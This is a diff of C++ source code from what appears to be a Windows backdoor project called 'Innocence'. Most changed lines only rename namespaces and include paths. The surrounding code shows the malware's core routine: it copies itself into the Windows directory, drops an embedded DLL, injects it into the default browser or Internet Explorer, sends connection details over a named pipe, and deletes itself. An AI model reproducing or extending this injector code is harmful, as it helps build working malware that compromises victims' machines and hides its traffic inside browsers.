@@ -3,11 +3,11 @@
 #include <malicious/Injector.hpp>
 #include <malicious/BinaryRessource.hpp>
 #include <malicious/InternetExplorer.hpp>
-#include <Innocence.hpp>
-#include <common/Log.hpp>
+#include <common/Innocence.hpp>
+#include <log/Log.hpp>
 #include <network/Pipe.hpp>
 #include "Inhibiter.hpp"
-#include <Innocence.hpp>
+#include <common/Innocence.hpp>
 
 #include "SlaveDll.hpp"
 #include <shlwapi.h>
@@ -21,8 +21,8 @@ namespace Inhibiter
         current_executable_path = executable;
         System::getWindowsPath(install_directory);
 
-        executable_path = install_directory + "\\" + Innocence::INHIBITER_EXE_NAME;
-        dll_path = install_directory + "\\" + Innocence::INHIBITION_DLL_NAME;
+        executable_path = install_directory + "\\" + Common::INHIBITER_EXE_NAME;
+        dll_path = install_directory + "\\" + Common::INHIBITION_DLL_NAME;
     }
 
     void InhibiterCore::install()
@@ -31,7 +31,7 @@ namespace Inhibiter
         // par défaut, si il existe déja un exécutale de l'injecteur, celui-ci est directement remplacé.
         if(CopyFile(current_executable_path.c_str(), executable_path.c_str(), FALSE) == FALSE)
         {
-			throw Common::Exception("Unable to install injector, CopyFile failed : " + toString(GetLastError()));
+			throw Common::Exception("Unable to install injector, CopyFile failed : " + Common::toString(GetLastError()));
         }
 
 		System::Process::Launcher finish_install(executable_path, "\"" + current_executable_path + "\"");
@@ -47,7 +47,7 @@ namespace Inhibiter
         // efface la DLL d'inhibition
         if(!DeleteFile(dll_path.c_str()))
         {
-			throw Common::Exception("Unable to delete dll, DeleteFile failed : " + toString(GetLastError()));
+			throw Common::Exception("Unable to delete dll, DeleteFile failed : " + Common::toString(GetLastError()));
         }
 
         // cet executable doit s'auto-effacer pour terminer la désinstallation
@@ -59,7 +59,7 @@ namespace Inhibiter
         LOG << "Temporary exe, deleting injector";
         if(!DeleteFile(executable_path.c_str()))
         {
-            throw Common::Exception("Unable to delete injector, DeleteFile failed : " + toString(GetLastError()));
+            throw Common::Exception("Unable to delete injector, DeleteFile failed : " + Common::toString(GetLastError()));
         }
     }
 
@@ -85,13 +85,13 @@ namespace Inhibiter
         TRACE_FUNCTION
         Sleep(1000);
         Malicious::BinaryRessource substrate(SlaveDll, sizeof(SlaveDll), dll_path);
-        if(Innocence::INJECT_DEFAULT_BROWSER)
+        if(Common::INJECT_DEFAULT_BROWSER)
         {
             DWORD size = MAX_PATH;
             TCHAR buff[MAX_PATH];
             if(AssocQueryString(0, ASSOCSTR_EXECUTABLE, ".html", NULL ,buff , &size) != S_OK)
             {
-                processToInject = Innocence::DEFAULT_INJECTED_PROCESS_NAME;
+                processToInject = Common::DEFAULT_INJECTED_PROCESS_NAME;
             }
             else
             {
@@ -100,11 +100,11 @@ namespace Inhibiter
         }
         else
         {
-            processToInject = Innocence::DEFAULT_INJECTED_PROCESS_NAME;
+            processToInject = Common::DEFAULT_INJECTED_PROCESS_NAME;
         }
 
 		Malicious::InternetExplorer ie;
-		LOG << "Injecting IE with PID : " + toString(ie.getPid());
+		LOG << "Injecting IE with PID : " + Common::toString(ie.getPid());
 		try
 		{
 			Malicious::inject(ie.getPid(), dll_path);
@@ -131,13 +131,13 @@ namespace Inhibiter
 			// pour ce faire, on utilise les "pipe" à la windows (IPC)
 			Network::Pipe pipe_server;
 
-			pipe_server.listen(Innocence::PIPE_NAME);
+			pipe_server.listen(Common::PIPE_NAME);
 			LOG << "Pipe server waiting for connection";
 			if(pipe_server.accept())
 			{
-					LOG << "Sending connection informations : "+string(Innocence::blaspheme, Innocence::CONNECTION_INFO_SIZE);
+					LOG << "Sending connection informations : "+string(Common::blaspheme, Common::CONNECTION_INFO_SIZE);
 					//pipe_server.send(buffer.c_str(), buffer.size());
-					pipe_server.send(Innocence::blaspheme, Innocence::CONNECTION_INFO_SIZE);
+					pipe_server.send(Common::blaspheme, Common::CONNECTION_INFO_SIZE);
 			}
 			pipe_server.disconnect();
 		}
